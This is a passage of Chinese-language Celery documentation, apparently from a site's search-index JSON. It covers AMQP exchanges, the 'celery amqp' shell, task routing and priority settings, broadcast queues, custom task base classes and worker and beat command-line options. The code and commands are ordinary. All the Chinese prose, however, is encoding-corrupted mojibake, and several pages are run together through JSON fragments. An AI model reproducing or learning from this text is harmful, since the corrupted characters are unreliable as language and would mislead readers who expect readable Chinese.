ç›´è¿äº¤æ¢æœºé€šè¿‡ç²¾ç¡®çš„è·¯ç”±é”®æ¥è¿›è¡ŒåŒ¹é…ï¼Œæ‰€ä»¥è¢«è·¯ç”±é”® video ç»‘å®šçš„é˜Ÿåˆ—åªæ¥æ”¶å…·æœ‰è¯¥è·¯ç”±é”®çš„æ¶ˆæ¯ã€‚ ä¸»é¢˜äº¤æ¢æœº ä¸»é¢˜äº¤æ¢æœºé€šè¿‡ä»¥ç‚¹åˆ†éš”çš„å•è¯å’Œé€šé…ç¬¦æ¥åŒ¹é…è·¯ç”±é”®: *(åŒ¹é…å•ä¸ªå•è¯) #(åŒ¹é…é›¶æˆ–å¤šä¸ªå•è¯)ã€‚ å‡å¦‚æœ‰å¦‚ä¸‹è·¯ç”±é”®: usa.news usa.weather norway.news norway.weather å¯ä»¥é€šè¿‡ç»‘å®š *.news æ¥æ¥æ”¶æ‰€æœ‰çš„æ–°é—»ï¼Œ ç»‘å®š usa.# æ¥æ¥æ”¶ä¸ USA æœ‰å…³çš„æ‰€æœ‰æ¶ˆæ¯ï¼Œ æˆ–ç»‘å®š usa.weather æ¥æ¥æ”¶æ‰€æœ‰ä¸ USA å¤©æ°”æœ‰å…³çš„æ¶ˆæ¯ã€‚ ç›¸å…³çš„APIå‘½ä»¤ declare é€šè¿‡åç§°å£°æ˜äº¤æ¢æœº declare æ³¨è§£ å£°æ˜å¹¶ä¸ä»£è¡¨åˆ›å»ºï¼Œåœ¨ä½ å£°æ˜çš„æ—¶å€™ï¼Œä½ å¯ä»¥æ–­å®šè¿™ä¸ªå®ä½“å·²ç»å­˜åœ¨ï¼Œå¹¶ä¸”æ˜¯å¯æ“ä½œçš„ã€‚ è¿™é‡Œå¹¶æ²¡æœ‰è§„å®šæ¶ˆè´¹è€…æˆ–ç”Ÿäº§è€…ä¸­çš„å“ªä¸€æ–¹éœ€è¦æœ€å…ˆåˆ›å»ºäº¤æ¢æœº/é˜Ÿåˆ—/ç»‘å®šã€‚ é€šå¸¸æ¥è¯´ï¼Œæœ€å…ˆéœ€è¦å®ƒçš„å“ªä¸€æ–¹å°±ä¼šåˆ›å»ºå®ƒã€‚ ä½¿ç”¨ API Celery è‡ªå¸¦äº†ä¸€ä¸ªåä¸º celery amqp çš„å·¥å…·ï¼Œç”¨äºé€šè¿‡å‘½ä»¤è¡Œæ¥æ“ä½œ AMQP API å»ç®¡ç†ä»»åŠ¡ï¼Œ æ¯”å¦‚è¯´åˆ›å»ºæˆ–è€…åˆ é™¤é˜Ÿåˆ—æˆ–äº¤æ¢æœºï¼Œæ¸…ç†é˜Ÿåˆ—æˆ–å‘é€æ¶ˆæ¯ã€‚ è¯¥å·¥å…·ä¹Ÿå¯ä»¥ç”¨äº é AMQP çš„ä¸­é—´äººï¼Œä½†æ˜¯ä¸ä¸€å®šå®ç°äº†æ‰€æœ‰çš„å‘½ä»¤æ“ä½œã€‚ ä½ å¯ä»¥ç›´æ¥åœ¨`celery amqp çš„å‘½ä»¤é‡Œå†™å‚æ•°ï¼Œæˆ–è€…æ— å‚æ•°å¯åŠ¨å‘½ä»¤æ¨¡å¼: $ celery -A proj amqp -> connecting to amqp://guest@localhost:5672/. -> connected. 1> è¿™é‡Œçš„ 1> æ˜¯å‘½ä»¤æç¤ºã€‚æ•°å­— 1 è¡¨ç¤ºåˆ°ç›®å‰ä¸ºæ­¢æŒ‡å®šçš„å‘½ä»¤æ•°ã€‚ è¾“å…¥ help å¯ä»¥å¾—åˆ°æ‰€æœ‰å¯ç”¨çš„å‘½ä»¤åˆ—è¡¨ã€‚å·¥å…·è¿˜æ”¯æŒè‡ªåŠ¨è¡¥å…¨ï¼Œæ‰€ä»¥ä½ å¯ä»¥è¾“å…¥ä¸€ä¸ªå‘½ä»¤ç„¶åæŒ‰ tab é”®æ¥æ˜¾ç¤ºå¯èƒ½åŒ¹é…åˆ°çš„å‘½ä»¤åˆ—è¡¨ã€‚ è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªä½ å¯ä»¥å‘é€æ¶ˆæ¯çš„é˜Ÿåˆ—: 1> exchange.declare testexchange direct ok. 2> queue.declare testqueue ok. queue:testqueue messages:0 consumers:0. 3> queue.bind testqueue testexchange testkey ok. ä¸Šæ–¹çš„å‘½ä»¤åˆ›å»ºäº†ä¸€ä¸ªç›´è¿äº¤æ¢æœº testexchange å’Œä¸€ä¸ªåä¸º testqueue çš„é˜Ÿåˆ—ã€‚è¯¥é˜Ÿåˆ—é€šè¿‡è·¯ç”±é”® testkey ç»‘å®šåˆ°ç›´è¿äº¤æ¢æœºã€‚ ä»ç°åœ¨å¼€å§‹ï¼Œæ‰€æœ‰å‘é€åˆ° testexchange äº¤æ¢æœºçš„å¸¦æœ‰è·¯ç”±é”®testkey çš„æ¶ˆæ¯å°†è¢«ç§»åŠ¨åˆ°é˜Ÿåˆ— testqueue ä¸­ã€‚ ä½ å¯ä»¥é€šè¿‡ basic.publish å‘½ä»¤å‘é€ä¸€æ¡æ¶ˆæ¯: 4> basic.publish 'This is a message!' testexchange testkey ok. ç°åœ¨æ¶ˆæ¯å·²ç»å‘é€å‡ºå»ï¼Œä½ å¯ä»¥å»è·å–æ¶ˆæ¯äº†ã€‚ ä½ å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨ basic.get å‘½ä»¤ï¼Œè¯¥å‘½ä»¤å°†ä¼šä»¥åŒæ­¥è½®è¯¢çš„æ–¹å¼å»è·å–é˜Ÿåˆ—ä¸­çš„æ–°æ¶ˆæ¯ (è¿™ç§æ–¹å¼å¯¹äºç»´æŠ¤ä»»åŠ¡æ¥è¯´æ˜¯è¿˜å¯ä»¥çš„ï¼Œä½†æ˜¯å¯¹äºæœåŠ¡æ¥è¯´ï¼Œä½ éœ€è¦ä½¿ç”¨ basic.consumeå‘½ä»¤æ¥ä»£æ›¿å®ƒ) ä»é˜Ÿåˆ—ä¸­å¼¹å‡ºä¸€æ¡æ¶ˆæ¯: {'body': 'This is a message!', 'delivery_info': {'delivery_tag': 1, 'exchange': u'testexchange', 'message_count': 0, 'redelivered': False, 'routing_key': u'testkey'}, 'properties': {}} AMQP ä½¿ç”¨ç¡®è®¤æ¥è¡¨æ˜ä¸€æ¡æ¶ˆæ¯å·²ç»è¢«æ¥æ”¶å¹¶ä¸”æˆåŠŸå¤„ç†ã€‚ å¦‚æœæ¶ˆæ¯æ²¡æœ‰è¢«ç¡®è®¤å¹¶ä¸”æ¶ˆè´¹è€…çš„é€šé“å…³é—­äº†ï¼Œæ¶ˆæ¯å°†è¢«ä¼ é€’ç»™å¦ä¸€ä¸ªæ¶ˆè´¹è€…ã€‚ è¯·æ³¨æ„ä¸Šæ–¹ç»“æ„ä¸­åˆ—å‡ºæ¥çš„ä¼ é€’æ ‡è®° delivery_tag ; å†æ¯ä¸ªè¿æ¥é€šé“ä¸­ï¼Œæ¯ä¸ªæ¥æ”¶åˆ°çš„æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ä¼ é€’æ ‡è®°ï¼Œè¿™ä¸ªæ ‡è®°ç”¨æ¥ç¡®è®¤æ¶ˆæ¯ã€‚ ä½†æ˜¯è¦æ³¨æ„ï¼Œä¼ é€’æ ‡è®°å¹¶ä¸æ˜¯è·¨è¿æ¥å”¯ä¸€çš„ï¼Œæ‰€ä»¥åœ¨å¦ä¸€ä¸ªå®¢æˆ·ç«¯ä¸­ï¼Œä¼ é€’æ ‡è®°ä¸º 1 çš„æ¶ˆæ¯å¯èƒ½ä¸å½“å‰è¿æ¥ä¸­çš„æ¶ˆæ¯æ˜¯ä¸ä¸€è‡´çš„ã€‚ ä½ å¯ä»¥é€šè¿‡ basic.ack å‘½ä»¤æ¥ç¡®è®¤ä½ æ”¶åˆ°çš„æ¶ˆæ¯: 6> basic.ack 1 ok. åœ¨æˆ‘ä»¬çš„æµ‹è¯•å›è¯ç»“æŸåï¼Œä½ åº”è¯¥æ¸…é™¤ä½ åˆ›å»ºçš„å®ä½“: 7> queue.delete testqueue ok. 0 messages deleted. 8> exchange.delete testexchange ok. è·¯ç”±ä»»åŠ¡ é˜Ÿåˆ—å£°æ˜ åœ¨ Celery å­˜åœ¨çš„é˜Ÿåˆ—å¯ä»¥é€šè¿‡ task_queues æ¥è®¾ç½®ã€‚ ä¸‹æ–¹æ˜¯ä¸€ä¸ªåŒ…å«ä¸‰ä¸ªé˜Ÿåˆ—çš„ç¤ºä¾‹é˜Ÿåˆ—é…ç½®; ä¸€ä¸ªç”¨äºè§†é¢‘ï¼Œä¸€ä¸ªç”¨äºå›¾ç‰‡ï¼Œå¦ä¸€ä¸ªç”¨äºå…¶ä»–æ¶ˆæ¯çš„é»˜è®¤é˜Ÿåˆ—: default_exchange = Exchange('default', type='direct') media_exchange = Exchange('media', type='direct') app.conf.task_queues = ( Queue('default', default_exchange, routing_key='default'), Queue('videos', media_exchange, routing_key='media.video'), Queue('images', media_exchange, routing_key='media.image') ) app.conf.task_default_queue = 'default' app.conf.task_default_exchange = 'default' app.conf.task_default_routing_key = 'default' åœ¨è¿™é‡Œ task_default_queue æŒ‡å®šé˜Ÿåˆ—å°†è¢«ç”¨äºè·¯ç”±é‚£äº›æ²¡æœ‰æ˜¾ç¤ºæŒ‡å®šé˜Ÿåˆ—çš„ä»»åŠ¡ã€‚ task_default_exchangeï¼Œexchange type ä»¥åŠrouting key å°†è¢«ç”¨ä½œäºä»»åŠ¡çš„é»˜è®¤å€¼ï¼Œ å¹¶ä¸”ä¹Ÿè¢«ç”¨ä½œäº task_queues ä¸­çš„å®ä½“çš„é»˜è®¤å€¼ã€‚ å¯¹å•ä¸ªé˜Ÿåˆ—çš„å¤šä¸ªç»‘å®šä¹Ÿæ˜¯è¢«æ”¯æŒçš„ã€‚å¦‚ä¸‹ä¸€ä¸ªä¸¤ä¸ªè·¯ç”±é”®åŒæ—¶ç»‘å®šäºåŒä¸€ä¸ªé˜Ÿåˆ—çš„ä¾‹å­: from kombu import Exchange, Queue, binding media_exchange = Exchange('media', type='direct') CELERY_QUEUES = ( Queue('media', [ binding(media_exchange, routing_key='media.video'), binding(media_exchange, routing_key='media.image'), ]), ) æŒ‡å®šä»»åŠ¡ç›®æ ‡ ä»»åŠ¡çš„ç›®æ ‡æ˜¯é€šè¿‡å¦‚ä¸‹çš„(æŒ‰é¡ºåº)çš„æ–¹å¼å†³å®šçš„: Task.apply_async çš„è·¯ç”±å‚æ•° åœ¨ä»»åŠ¡æœ¬èº«å®šä¹‰çš„è·¯ç”±å‚æ•° åœ¨ task_routes ä¸­å®šä¹‰çš„ Routers æœ€å¥½çš„åšæ³•æ˜¯ä¸åœ¨é…ç½®ä¸­è¿›è¡Œç¡¬ç¼–ç ï¼Œè€Œæ˜¯å°†å…¶ä½œä¸º Routers çš„é…ç½®ã€‚è¿™æ˜¯æœ€çµæ´»çš„ï¼Œå¹¶ä¸”åˆç†çš„é»˜è®¤å€¼ä»ç„¶å¯ä»¥è®¾ç½®ä¸ºä»»åŠ¡çš„å±æ€§ã€‚ è·¯ç”±å™¨ è·¯ç”±å™¨æ˜¯å†³å®šä»»åŠ¡çš„è·¯ç”±é€‰é¡¹çš„å‡½æ•°ã€‚ å®šä¹‰ä¸€ä¸ªæ–°çš„è·¯ç”±å™¨ï¼Œä½ æ‰€éœ€è¦åšçš„æ˜¯é€šè¿‡ç­¾å (name, args, kwargs, options, task=None, **kw) å®šä¹‰ä¸€ä¸ªå‡½æ•°: def route_task(name, args, kwargs, options, task=None, **kw): if name == 'myapp.tasks.compress_video': return {'exchange': 'video', 'exchange_type': 'topic', 'routing_key': 'video.compress'} å¦‚æœä½ è¿”å›é˜Ÿåˆ—çš„é”®å€¼ï¼Œå®ƒå°†ä¼šå¸¦ç€åœ¨task_queues ä¸­å®šä¹‰çš„é…ç½®å±•å¼€: {'queue': 'video', 'routing_key': 'video.compress'} å˜æˆ -> {'queue': 'video', 'exchange': 'video', 'exchange_type': 'topic', 'routing_key': 'video.compress'} ä½ å¯ä»¥é€šè¿‡å°†è·¯ç”±å™¨çš„ç±»æ·»åŠ åˆ° task_routes çš„é…ç½®ä¸­æ¥å®‰è£…è·¯ç”±å™¨: task_routes = (route_task,) è·¯ç”±å™¨æ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡åç§°æ·»åŠ : task_routes = ('myapp.routers.route_task',) å¯¹äºç±»ä¼¼ä¸Šæ–¹ç¤ºä¾‹çš„ç®€å•çš„ä»»åŠ¡åç§°->è·¯ç”±æ˜ å°„ï¼Œä½ å¯ä»¥ç®€å•åœ°å°†å­—å…¸æ”¾ç½®åœ¨ task_routes ä¸­æ¥è¿‡çš„åŒæ ·çš„è¡Œä¸ºæ•ˆæœ: task_routes = { 'myapp.tasks.compress_video': { 'queue': 'video', 'routing_key': 'video.compress', }, } å°†ä¼šæŒ‰ç…§é¡ºåºéå†è·¯ç”±å™¨ï¼Œç›´åˆ°åœ¨ç¬¬ä¸€ä¸ªè¿”å›çœŸçš„è·¯ç”±å™¨å¤„åœæ­¢ï¼Œå¹¶å°†è¯¥è·¯ç”±å™¨ç”¨ä½œä¸ºä»»åŠ¡çš„æœ€ç»ˆè·¯ç”±å™¨ã€‚ ä½ ä¹Ÿå¯ä»¥å°†å¤šä¸ªè·¯ç”±å™¨å®šä¹‰åœ¨ä¸€ä¸ªåºåˆ—ä¸­: task_routes = [ route_task, { 'myapp.tasks.compress_video': { 'queue': 'video', 'routing_key': 'video.compress', }, ] è·¯ç”±å™¨å°†ä¼šè¢«æŒ‰é¡ºåºè®¿é—®ï¼Œå¹¶é€‰æ‹©ç¬¬ä¸€ä¸ªè¿”å›çš„å€¼ã€‚ å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Redis æˆ– RabbitMQ ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨è·¯ç”±å™¨ä¸­æŒ‡å®šé˜Ÿåˆ—çš„é»˜è®¤ä¼˜å…ˆçº§: task_routes = { 'myapp.tasks.compress_video': { 'queue': 'video', 'routing_key': 'video.compress', 'priority': 10, }, } ç±»ä¼¼çš„ï¼Œå¯¹ä»»åŠ¡ä½¿ç”¨ apply_async è°ƒç”¨æ—¶ï¼Œä¼ é€’çš„å‚æ•°å°†ä¼šè¦†ç›–é»˜è®¤çš„ä¼˜å…ˆçº§: task.apply_async(priority=0) ä¼˜å…ˆçº§é¡ºåºå’Œé›†ç¾¤å“åº” éœ€è¦é‡è§†çš„æ˜¯ï¼Œå› ä¸ºèŒç¨‹(worker) çš„é¢„å–æœºåˆ¶ï¼Œå¦‚æœåŒä¸€æ—¶é—´æäº¤äº†ä¸€å †ä»»åŠ¡ï¼Œé‚£ä¹ˆå®ƒä»¬çš„ä¼˜å…ˆçº§é¡ºåºå¯èƒ½å‘ç”Ÿæ··ä¹±ã€‚ ç¦ç”¨èŒç¨‹çš„é¢„å–å¯ä»¥é˜²æ­¢è¯¥é—®é¢˜ï¼Œä½†æ˜¯å¯¹äºå°è€Œå¿«çš„ä»»åŠ¡ï¼Œè¿™ä¹ˆåšä¼šå¯¼è‡´è¾¾ä¸åˆ°ç†æƒ³çš„æ€§èƒ½ã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç®€å•çš„å°† worker_prefetch_multiplier å‚æ•°å‡å°‘åˆ° 1ï¼Œ æ˜¯ä¸€ä¸ªç®€å•è€Œæ¸…æ™°çš„æ–¹å¼æ¥æå‡ç³»ç»Ÿçš„çµæ•æ€§ï¼Œå¹¶ä¸”ä¸ä¼šå­˜åœ¨ç¦ç”¨é¢„å–å¸¦æ¥çš„æˆæœ¬ã€‚ è¦æ³¨æ„çš„æ˜¯ä¼˜å…ˆçº§çš„é¡ºåºæ˜¯æŒ‰ç…§å€¼çš„ååºæ¥æ’åˆ—çš„ï¼š0 æ˜¯æœ€é«˜ä¼˜å…ˆçº§ã€‚ å¹¿æ’­ Celery ä¹Ÿæ”¯æŒå¹¿æ’­è·¯ç”±ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ª broadcast_tasks äº¤æ¢æœºçš„ç¤ºä¾‹, å®ƒå°†ä»»åŠ¡åˆ†å‘ç»™æ‰€æœ‰è¿æ¥åˆ°å®ƒçš„èŒç¨‹: from kombu.common import Broadcast app.conf.task_queues = (Broadcast('broadcast_tasks'),) app.conf.task_routes = { 'tasks.reload_cache': { 'queue': 'broadcast_tasks', 'exchange': 'broadcast_tasks' } } ç°åœ¨ä»»åŠ¡ tasks.reload_cache å°†ä¼šè¢«è¢«å‘é€ç»™ä»å½“å‰é˜Ÿåˆ—ä¸­æ¶ˆè´¹çš„æ‰€æœ‰èŒç¨‹ã€‚ å¦‚ä¸‹æ˜¯å¦ä¸€ä¸ªå…³äºå¹¿æ’­è·¯ç”±çš„ä»»åŠ¡ï¼Œè¿™æ¬¡ä½¿ç”¨äº† celery beat å®šæ—¶å™¨: from kombu.common import Broadcast from celery.schedules import crontab app.conf.task_queues = (Broadcast('broadcast_tasks'),) app.conf.beat_schedule = { 'test-task': { 'task': 'tasks.reload_cache', 'schedule': crontab(minute=0, hour='*/3'), 'options': {'exchange': 'broadcast_tasks'} }, } å¹¿æ’­å’Œç»“æœ æ³¨æ„ Celery ç»“æœå¹¶æ²¡æœ‰å®šä¹‰å¦‚æœæœ‰ä¸¤ä¸ªä»»åŠ¡ä½¿ç”¨åŒä¸€ä¸ªä»»åŠ¡ ID æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ å¦‚æœåŒä¸€ä¸ªäººä»»åŠ¡è¢«æ´¾å‘åˆ°å¤šäºä¸€ä¸ªèŒç¨‹ï¼Œè¯¥ä»»åŠ¡çš„çŠ¶æ€å†å²å°†ä¸è¢«ä¿ç•™ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹è®¾ç½® task.ignore_result å±æ€§å¿½ç•¥ä»»åŠ¡ç»“æœå°†ä¼šæ˜¯ä¸ªå¥½ä¸»æ„ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-AMQP-Introduction.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-AMQP-Introduction.html"},{"title":"åº”ç”¨è®¾è®¡(ç¼–ç )æ‹“å±•","text":"ä»»åŠ¡åŸºç±»æ›´æ–° è£…é¥°å™¨çš„ base å‚æ•°å¯ä»¥æŒ‡å®šç»§æ‰¿çš„ä»»åŠ¡åŸºç±»: import celery class MyTask(celery.Task): def on_failure(self, exc, task_id, args, kwargs, einfo): print('{0!r} failed: {1!r}'.format(task_id, exc)) @task(base=MyTask) def add(x, y): raise KeyError() ä¹Ÿå¯ä»¥æ‰‹åŠ¨ç›´æ¥æ›´æ–° app åŸºç±»å±æ€§: >>> from celery import Celery, Task >>> app = Celery() >>> class MyBaseTask(Task): ... queue = 'hipri' >>> app.Task = MyBaseTask >>> app.Task <unbound MyBaseTask> >>> @app.task ... def add(x, y): ... return x + y >>> add <@task: __main__.add> >>> add.__class__.mro() [<class add of <Celery __main__:0x1012b4410>>, <unbound MyBaseTask>, <unbound Task>, <type 'object'>] è°ƒç”¨å®ä¾‹æ–¹æ³• åœ¨ celery ä¸­ä¹Ÿå«ç»‘å®šæ–¹æ³•, ä½¿ç”¨ bind å‚æ•° è¢«ç»‘å®šçš„ä»»åŠ¡æ„å‘³ç€ä»»åŠ¡çš„ç¬¬ä¸€ä¸ªå‚æ•°æ€»æ˜¯ä»»åŠ¡å®ä¾‹ï¼ˆselfï¼‰ï¼Œå°±åƒPythonç»‘å®šæ–¹æ³•ä¸€æ ·: logger = get_task_logger(__name__) @task(bind=True) def add(self, x, y): logger.info(self.request.id) æ³¨æ„è¿™é‡Œçš„ self æ˜¯ task å®ä¾‹","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Application-design-expansion.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Application-design-expansion.html"},{"title":"å‘½ä»¤è¡Œé€‰é¡¹è¯´æ˜","text":"è¯­æ³•, Celery command entrypoint celery [OPTIONS] COMMAND [ARGS]... é€‰é¡¹å‚æ•° -A , --app æŒ‡å®šè¿è¡Œçš„ Celery åº”ç”¨ç¨‹åºå®ä¾‹ï¼Œæ ¼å¼å¿…é¡»ä¸º module.path:attribute ä½†å¦‚æœåªè®¾ç½®åŒ…åï¼Œå®ƒå°†è¿›è¡Œæœç´¢appå®ä¾‹, è¯¦ç»†è§ app_args -b , --broker TEXT, ä¸­é—´äºº, ä¼šè¦†ç›–ä»£ç é‡Œçš„é…ç½® --result-backend TEXT, ç»“æœåç«¯ --loader TEXT --config TEXT --workdir PATH, å·¥ä½œç›®å½• -C , --no-color æ— é¢œè‰²? -q , --quiet å®‰é™æ¨¡å¼? --version ç‰ˆæœ¬ä¿¡æ¯ --help Show this message and exit. æ”¯æŒçš„å‘½ä»¤ å…³äº app å‚æ•°è¯´æ˜: ä½¿ç”¨ --app å‚æ•°å¯ä¹ŸæŒ‡å®šè¿è¡Œçš„ Celery åº”ç”¨ç¨‹åºå®ä¾‹ï¼Œæ ¼å¼å¿…é¡»ä¸º module.path:attribute ä½†å¦‚æœåªè®¾ç½®åŒ…åï¼Œå®ƒå°†è¿›è¡Œæœç´¢appå®ä¾‹ï¼Œé¡ºåºå¦‚ä¸‹: ç”¨ --app=proj: åä¸º proj.app çš„å±æ€§. åä¸º proj.celery çš„å±æ€§ æ¨¡å— proj ä¸­å€¼ä¸º Celery åº”ç”¨ç¨‹åºçš„ä»»ä½•å±æ€§ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°†å°è¯•æ£€ç´¢åä¸º proj.celeryçš„å­æ¨¡å— åä¸º proj.celery.app çš„å±æ€§ åä¸º proj.celery.celery çš„å±æ€§ æ¨¡å— proj.celery ä¸­å€¼ä¸º Celery åº”ç”¨ç¨‹åºçš„ä»»ä½•å±æ€§ åœ¨æ­¤æ–¹æ¡ˆæ¨¡ä»¿æ–‡æ¡£ä¸­ä½¿ç”¨çš„å®ä¾‹ï¼Œå³ é’ˆå¯¹å•ä¸ªæ¨¡å—åŒ…å«çš„proj:app ï¼Œä»¥åŠ å¤§å‹é¡¹ç›®çš„ proj.celery:app æ³¨è§£ ä½¿ç”¨ celery 5.2 è²Œä¼¼ä¸èƒ½è‡ªåŠ¨è¯†åˆ« proj.app äº†. è‡ªåŠ¨è¯†åˆ«çš„è¯åªèƒ½å†™ celery.py æ”¯æŒçš„å‘½ä»¤ Commands: amqp æ‰“å¼€ AMQP Shell. beat å¯åŠ¨èŠ‚æ‹å‘¨æœŸä»»åŠ¡è°ƒåº¦ç¨‹åº. call å‘½ä»¤è¡Œè°ƒç”¨ä¸€ä¸ªä»»åŠ¡. control Workers è¿œç¨‹æ§åˆ¶. events äº‹ä»¶æµå®ç”¨ç¨‹åº. graph The ``celery graph`` command. inspect æ£€æŸ¥è¿è¡Œçš„Worker. list ä»ä¸­é—´äºº broker è·å–ä¿¡æ¯. logtool The ``celery logtool`` command. migrate å°†ä»»åŠ¡ä»ä¸€ä¸ª broker è¿ç§»åˆ°å¦ä¸€ä¸ª ä»£ç†(broker). multi å¯åŠ¨å¤šä¸ª worker å®ä¾‹. purge æ¸…é™¤æ‰€æœ‰å·²çŸ¥ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰æ¶ˆæ¯. report æ˜¾ç¤ºå¯åŒ…æ‹¬åœ¨é”™è¯¯æŠ¥å‘Šä¸­çš„æœ‰ç”¨ä¿¡æ¯. result æ‰“å°ç»™å®š ä»»åŠ¡ID(task id) çš„è¿”å›å€¼. shell æ‰“å¼€ä¸€ä¸ª shell ä¼šè¯æ¥ä¾¿æ·è®¿é—® celery. status æŸ¥çœ‹æ‰€æœ‰ workers çŠ¶æ€. upgrade æŸ¥çœ‹ç‰ˆæœ¬å‡çº§ä¿¡æ¯. worker å¯åŠ¨ worker å®ä¾‹. æ³¨è§£ æ³¨æ„, åƒ status è¿™æ ·çš„å‘½ä»¤éœ€è¦æ‰‹åŠ¨æŒ‡å®šé…ç½®: % celery -b redis://localhost:6379/0 status -> celery@yanquedembp.local: OK 1 node online. è‹¥ä½¿ç”¨é…ç½®æ–‡ä»¶: % celery --config src.time_schedule.celery_conf status -> celery@yanquedembp.local: OK 1 node online. æˆ–è€…ç›´æ¥æŒ‡å®šåº”ç”¨: % celery -A src.time_schedule status -> celery@yanquedembp.local: OK 1 node online. worker ç”¨æ³•: celery worker [OPTIONS] å¯åŠ¨ä¸€ä¸ª worker å®ä¾‹. Examples: $ celery --app=proj worker -l INFO $ celery -A proj worker -l INFO -Q hipri,lopri $ celery -A proj worker --concurrency=4 $ celery -A proj worker --concurrency=1000 -P eventlet $ celery worker --autoscale=10,0 æ¶ˆè´¹è€…é€‰é¡¹ Worker Options: -n , --hostname HOSTNAME è®¾å®šè‡ªå®šä¹‰ä¸»æœºå (e.g., w1@%%h ). Expands: %%h (hostname), %%n (name) and %%d, (domain). -D , --detach ä»¥åå°è¿›ç¨‹çš„å½¢å¼å¯åŠ¨ Start worker as a background process. -S , --statedb PATH çŠ¶æ€æ•°æ®åº“çš„è·¯å¾„, æ–‡ä»¶ä¸º db åç¼€ Path to the state database. The extension '.db' may be appended to the filename. -O <[default|fair]> åº”ç”¨ä¼˜åŒ–é…ç½®æ–‡ä»¶. -l , --loglevel <[DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL]> æ—¥å¿—ç­‰çº§. --prefetch-multiplier <prefetch multiplier> Set custom prefetch multiplier value for this worker instance. è¿™ä¸ªæ²¡æ‡‚ çº¿ç¨‹/è¿›ç¨‹æ± é€‰é¡¹ Pool Options: -c , --concurrency <concurrency> é˜Ÿåˆ—çš„è¿›ç¨‹æ•°ç›®, é»˜è®¤ä¸ºCPUä¸ªæ•°. -P , --pool <[prefork|eventlet|gevent|solo|processes|threads]> ä½¿ç”¨é‚£ç§æ± æ–¹å¼. è¿›ç¨‹æ± /çº¿ç¨‹æ± /æ—¶é—´æ± . -E , --task-events , --events å‘é€ä»»åŠ¡ç›¸å…³çš„æ—¶é—´èƒ½å¤Ÿè¢« (celery äº‹ä»¶ã€ celerymonã€ other) ç›‘è§†æ•è· --time-limit FLOAT å¼ºåˆ¶è®¾ç½®ä»»åŠ¡æ—¶é—´é™åˆ¶. å•ä½: ç§’; ç±»å‹: int/float --soft-time-limit FLOAT è®¾ç½®è½¯æ—¶é—´é™åˆ¶. å•ä½: ç§’; ç±»å‹: int/float. ä¸çŸ¥é“ä¸ä¸Šä¸€ä¸ªåŒºåˆ«åœ¨å“ª. --max-tasks-per-child INTEGER æ¯ä¸ªæ¶ˆè´¹è€…æ± èƒ½å¤Ÿæ‰§è¡Œçš„æœ€å¤§ä»»åŠ¡æ•°, è‹¥è¶…è¿‡å°†ä¼šä½¿ç”¨ä¸€ä¸ªæ–°çš„æ¶ˆè´¹è€…è¿›ç¨‹æ± (worker)æ›¿ä»£ --max-memory-per-child INTEGER æœ€å¤§é©»ç•™å†…å­˜. å•ä½: Kib. è‹¥è€—å°½å°†ä¼šä½¿ç”¨ä¸€ä¸ªæ–°çš„ æ¶ˆè´¹è€…è¿›ç¨‹æ± (worker). è‹¥å­˜åœ¨å•ä¸ªä»»åŠ¡å°±è¶…è¿‡äº†æœ€å¤§é©»ç•™å†…å­˜, åœ¨å®Œæˆæ­¤ä»»åŠ¡å, æ‰ä¼šä½¿ç”¨æ–°çš„ æ¶ˆè´¹è€…è¿›ç¨‹æ± (worker) æ¥æ›¿æ¢. é»˜è®¤æ— é™åˆ¶. é˜Ÿåˆ—é€‰é¡¹ Queue Options: -Q , --queues <COMMA SEPARATED LIST> é˜Ÿåˆ—, å¤šä¸ªä½¿ç”¨é€—å·åˆ†éš” -X , --exclude-queues <COMMA SEPARATED LIST> æ’é™¤é˜Ÿåˆ—, å¤šä¸ªä½¿ç”¨é€—å·åˆ†éš” -I , --include <COMMA SEPARATED LIST> åŒ…å«é˜Ÿåˆ—, å¤šä¸ªä½¿ç”¨é€—å·åˆ†éš” --purge , --discard æ¸…é™¤é˜Ÿåˆ—, å¤šä¸ªä½¿ç”¨é€—å·åˆ†éš” --discard æ¸…é™¤é˜Ÿåˆ—, å¤šä¸ªä½¿ç”¨é€—å·åˆ†éš” åŠŸèƒ½: --without-gossip --without-mingle --without-heartbeat --heartbeat-interval INTEGER --autoscale <MIN WORKERS>, <MAX WORKERS> Embedded Beat Options: -B, --beat -s, --schedule-filename, --schedule TEXT --scheduler TEXT Daemonization Options: -f, --logfile TEXT --pidfile TEXT --uid TEXT --uid TEXT --gid TEXT --umask TEXT --executable TEXT beat ç”¨æ³•: celery beat [OPTIONS] å¯åŠ¨å‘¨æœŸä»»åŠ¡è°ƒåº¦, è®¾ç½® contrab ä»»åŠ¡ç­‰å®šæ—¶ä»»åŠ¡æ—¶, éœ€è¦ä½¿ç”¨æ­¤å‘½ä»¤æ¥å‘ç°æ³¨å†Œå®šæ—¶ä»»åŠ¡. Beat Options: --detach ä½œä¸ºå®ˆæŠ¤è¿›ç¨‹ç‹¬ç«‹æ‰§è¡Œ -s , --schedule TEXT æ‰§è¡Œæ•°æ®åº“çš„è·¯å¾„. é»˜è®¤ä¸º celerybeat-schedule . The extension '.db' may be appended to the filename. -S , --scheduler TEXT ä½¿ç”¨å“ªä¸ªè°ƒåº¦å™¨(scheduler)ç±» --max-interval INTEGER è°ƒåº¦å™¨è½®è¯¢çš„é—´éš”æ—¶é—´. 